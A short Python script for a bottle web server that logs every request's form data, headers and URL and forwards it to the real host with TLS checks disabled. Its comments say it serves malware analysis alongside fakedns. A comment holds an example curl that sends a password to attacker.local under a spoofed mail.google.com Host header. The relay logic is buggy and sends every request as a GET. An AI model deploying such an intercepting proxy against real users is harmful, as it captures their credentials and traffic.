import pip
pip.main(['install','bottle','requests'])
import requests, bottle, urllib3
from bottle import *
urllib3.disable_warnings()

# Simple webserver that redirects traffic and prints all the juicy stuff back.
# For use with fakedns responding to all malware requests pointing here.
# curl -X POST -d "test=testing&password=OMGYOUGOTME" "http://attacker.local:8080/login.php?userid=209310842038" -H "Host: mail.google.com" -L -A "chrome or something" -v
# ~ Just an example ~

@bottle.route("/<url:re:.*>", method=["GET","POST"])
def index(url):
    if request.method=="POST":
        form_data = request.forms.dict
    else:
        form_data=""
    headers = dict(request.headers)
    print("Form Details: "+str(form_data))
    print("Headers: "+str(headers))
    print("URL: "+str(url))
    if form_data=="POST":
        response=requests.post("https://%s/%s" % (headers["Host"], url), data=form_data, headers=headers, verify=False)
    elif form_data=="GET":
        response=requests.get("https://%s/%s" % (headers["Host"], url), data=form_data, headers=headers, verify=False)
    else:
        response=requests.get("https://%s/%s" % (headers["Host"], url), data=form_data, headers=headers, verify=False)
    print("End url: "+str(response.url))
    print("Response Headers: "+str(response.headers))
    return response.raw

run(host='attacker.local', port=8080)
